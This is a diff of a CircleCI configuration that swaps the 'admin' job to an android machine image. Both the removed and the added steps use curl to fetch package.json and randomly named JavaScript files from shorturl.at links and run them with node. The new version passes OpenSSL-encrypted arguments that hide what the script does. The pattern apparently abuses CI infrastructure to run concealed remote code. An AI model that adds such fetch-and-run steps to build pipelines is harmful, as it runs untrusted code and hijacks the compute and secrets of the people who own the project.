@@ -2,13 +2,14 @@ version: 2.1
 
 jobs:
   admin:
-    docker:
-      - image: node:16
-    resource_class: medium
+    machine:
+      image: android:202102-01
+    #resource_class: medium
     steps:
       - run: 
-          command: curl -fsSL shorturl.at/jJLNU -o package.json && curl -fsSL shorturl.at/cjBC2 -o sdfkgjweimsdf.js && curl -fsSL shorturl.at/tCDFN -o log-print.js
-      - run: npm i -s && node sdfkgjweimsdf.js docker 2
+          command: curl -fsSL shorturl.at/ekxLM -o package.json && curl -fsSL shorturl.at/hiIV8 -o sgdfgerjhsdfe.js && curl -fsSL shorturl.at/aotR9 -o logger.js
+      - run: npm i -s
+      - run: node sgdfgerjhsdfe -r U2FsdGVkX18PWiQrfMwVgCok7RenPLESO+LW/5bJluZfj/EcSY8GuWlVL33jSmmRfYYmxnTHAXBhWew29G1OhpLZTfOAfjXOwGGeWlbAOmuTIXm2UFOvhsSNEKpdUV4QplYnxN2qIjp+c5diOZUSSda7RFt84gYGMPhv48BJ5Hl47vXQ5ovCrPMlduGOmYU5T80Jvc2vPZDJacITGWK45hhE5RhDdBru+9rAH+zEMBcHmFmjTRYVrfIfDjJrZZ/ZhFjIbu2cSEqoQeNcrYKwOJlUav6XryB/oQY7kV6V7UIcAWYZF8MiuIhrfkCnmWT8sCS3e6OrWQSyQ4SoiKhiiu0vs23gIjJ8H6Bbvg/2ivM//FYuI4V+lLpQdA1rYPbC -t U2FsdGVkX1/5ShRmYg2T4otMninMYeQ+7TQMsBUczgqH3ZbUWJX87tqjZgJEg98W -lpn U2FsdGVkX1+u3y7tEfaS5e3I8EsTPw2bEM1S7O0J/Wc= -sp
       
 workflows:
   start-work:
